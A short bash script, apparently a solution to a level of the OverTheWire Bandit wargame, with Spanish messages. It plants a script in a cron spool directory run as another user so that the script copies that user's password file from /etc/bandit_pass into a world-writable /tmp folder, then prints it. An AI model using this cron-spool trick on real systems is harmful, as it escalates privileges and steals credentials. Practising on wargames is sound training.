#!/bin/bash 

mkdir -p /tmp/lnn0v4 && chmod 777 /tmp/lnn0v4
directori=$(find / -type d -name lnn0v4 2>/dev/null)

if [ -d $directori ] ; then
        echo "#!/bin/bash" > script.sh
        echo "cat /etc/bandit_pass/bandit24 > /tmp/lnn0v4/flag.txt" >> script.sh
        chmod 777 script.sh
        if [ -s script.sh ]; then
                cp script.sh /var/spool/bandit24/foo/

                while [ ! -s /tmp/lnn0v4/flag.txt ]; do
                     sleep 8
                done

                rm script.sh
                cat "/tmp/lnn0v4/flag.txt"
        else
                echo "No se ha creado el script"
        fi
else
        echo "No existe la carpeta"
fi
